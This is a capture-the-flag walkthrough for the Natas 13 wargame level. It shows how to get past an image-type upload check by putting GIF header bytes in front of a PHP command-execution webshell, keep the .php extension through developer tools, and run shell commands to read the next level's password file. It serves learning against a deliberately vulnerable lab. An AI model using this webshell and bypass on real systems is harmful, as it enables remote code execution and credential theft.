- Background:
  - Uses `exif_imagetype()` to check if the uploaded file is an image or not
  - This PHP function reads the first few bytes of a file to determine the file type
    - Wonâ€™t be fooled by just changing the file extension
    - If the file does not begin with the header bytes that indicate it actually is an image file, it will be rejected
    - GIF start with this headers: `GIF87a`
- Solution:
  - Save as file.php: Prepend "GIF87a" to the start of the webshell
  ```php
  GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
  ```
  - Upload the file:
    - Website tries to change the file extension
    - To keep `.php`, open the Dev Tools and change the hidden file name

  - Getting an error because it's expecting a query value and isn't getting one, provide `?e=ls` to see other webshells
  - Supply an input of `?e=cat%20/etc/natas_webpass/natas14` to the webshell to get the flag: `http://natas13.natas.labs.overthewire.org/upload/oazgfldi85.php?e=cat%20/etc/natas_webpass/natas14`
